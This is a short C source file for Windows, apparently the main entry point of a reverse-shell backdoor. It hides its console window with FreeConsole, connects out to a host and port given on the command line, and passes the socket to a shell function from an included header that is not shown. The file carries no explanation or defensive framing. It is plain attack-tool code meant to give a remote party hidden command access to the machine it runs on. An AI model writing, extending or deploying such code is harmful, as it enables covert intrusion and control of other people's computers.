#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <winsock2.h>

#include "execShell.h"
#include "connect.h"

int main(int argc, char **argv){
    SOCKET s = 0;  
    setlocale(LC_ALL, "rus");
    FreeConsole();
    if(argc == 3){
        wsa_init();             
		if((s = connect_to_server(argv[1], atoi(argv[2]))) != SOCKET_ERROR)
			shell(s);
		close_server(s);
    }
    return 0;
}
